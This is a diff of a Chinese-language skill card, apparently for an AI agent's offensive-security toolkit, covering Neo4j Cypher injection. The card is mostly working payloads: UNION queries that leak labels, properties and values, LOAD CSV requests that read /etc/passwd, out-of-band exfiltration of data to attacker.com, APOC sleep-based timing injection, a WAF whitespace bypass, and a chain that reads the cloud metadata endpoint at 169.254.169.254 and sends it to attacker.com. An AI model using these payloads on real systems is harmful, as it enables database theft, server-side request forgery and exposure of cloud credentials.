@@ -4,7 +4,7 @@ description: 'Neo4j Cypher Injection：UNION泄露/LOAD CSV SSRF/OOB外带/时�
 disable-model-invocation: true
 metadata: { domain: db, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：用 skill 工具按名加载本卡。
 
 ## Cypher Injection (Neo4j)
 
@@ -18,67 +18,67 @@ metadata: { domain: db, tier: T3 }
 #### 简单闭合 + 条件绕过
 ```cypher
 ' OR 1=1 RETURN n//
-```
+```text
 原始查询：`MATCH (n) WHERE n.name = '$input' RETURN n`
 
 #### UNION 泄露标签
 ```cypher
 ' RETURN 1 AS x UNION CALL db.labels() YIELD label AS x RETURN x//
-```
+```text
 泄露所有节点标签（相当于 SQL 的 `SELECT table_name FROM information_schema.tables`）
 
 #### UNION 泄露属性名
 ```cypher
 ' RETURN 1 AS x UNION MATCH (n:TargetLabel) RETURN DISTINCT keys(n) AS x //
-```
+```text
 
 #### UNION 泄露属性值
 ```cypher
 ' RETURN 1 AS x UNION MATCH (n:TargetLabel) RETURN n.targetProperty AS x //
-```
+```text
 
 ### LOAD CSV — SSRF / 文件读取
 ```cypher
 ' RETURN 1 AS x UNION LOAD CSV FROM 'http://attacker.com/' + x AS y RETURN ''//
-```
+```text
 
 文件读取（如果 import 目录配置不当）：
 ```cypher
 ' RETURN 1 AS x UNION LOAD CSV FROM 'file:///etc/passwd' AS y RETURN ''//
-```
+```text
 
 ### LOAD CSV 外带数据（OOB）
 ```cypher
 ' CALL db.labels() YIELD label LOAD CSV FROM 'https://attacker.com/'+label AS r RETURN ''//
-```
+```text
 
 ### Sorcery Step 1 典型 Payload
 ```cypher
 ?name=Merlin'}) RETURN w UNION MATCH (n) WHERE n:Secret RETURN n //
-```
+```text
 闭合 `{name: '$input'}` → 注入 UNION 读取 Secret 节点。
 
 ### 时间注入（需 APOC）
 ```cypher
 ' RETURN 1 AS x UNION CALL apoc.util.sleep(5000) RETURN 1 AS x //
-```
+```text
 
 ### 检测 APOC 是否安装
 ```cypher
 CALL apoc.help('apoc')
-```
+```text
 
 ### WAF 绕过：空格过滤
 ```cypher
 MATCH/**/(n)/**/RETURN/**/n
-```
+```text
 
 ### SSRF 链式外带
 ```cypher
 LOAD CSV FROM 'http://169.254.169.254/latest/meta-data/' AS x
 LOAD CSV FROM 'https://attacker.com/'+x[0] AS y
 RETURN ''//
-```
+```text
 （先读内部端点 → 再外带到攻击者服务器）
 
 ### 工具
